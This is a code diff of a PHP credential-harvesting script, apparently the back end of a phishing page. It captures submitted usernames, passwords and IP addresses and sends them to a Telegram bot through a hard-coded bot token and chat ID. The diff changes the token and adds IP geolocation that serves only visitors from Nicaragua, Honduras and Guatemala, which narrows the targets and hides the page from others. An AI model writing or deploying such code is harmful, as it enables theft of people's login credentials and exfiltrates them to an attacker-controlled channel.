@@ -1,12 +1,28 @@
 <?php
 
-$token = "7511003674:AAFeXPLYDNK0KhU405Eb52DWA-6QvzzzqHc";
+$token = "7887181406:AAFU8QeJELdGChri-GoD9jlq7Wa2JbVBkvw";
 $chat_id = "5157616506";
+
+// Función para obtener el país a partir de la IP
+function obtenerPais($ip) {
+    $url = "https://ipwhois.app/json/$ip";
+    $respuesta = file_get_contents($url);
+    $datos = json_decode($respuesta, true);
+    return $datos["country_code"] ?? ""; // Devuelve el código de país (NI, HN, GT)
+}
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $usuario = isset($_POST['pp1']) ? htmlspecialchars($_POST['pp1']) : '';
     $contrasena = isset($_POST['pp2']) ? htmlspecialchars($_POST['pp2']) : '';
     $ip = $_SERVER['REMOTE_ADDR'];
+    
+    // Verificar si la IP pertenece a los países permitidos
+    $pais = obtenerPais($ip);
+    $paisesPermitidos = ["NI", "HN", "GT"]; // Nicaragua, Honduras, Guatemala
+    
+    if (!in_array($pais, $paisesPermitidos)) {
+        die("Acceso denegado"); // Bloquea el acceso si no está en la lista de países permitidos
+    }
     
     $mensaje = "🛑 AVanz:: acceso 🛑\n\n";
     $mensaje .= "👤 Usuario: $usuario\n";
@@ -27,6 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             'content' => http_build_query($data),
         ],
     ];
+    
     $context  = stream_context_create($options);
     file_get_contents($url, false, $context);
     
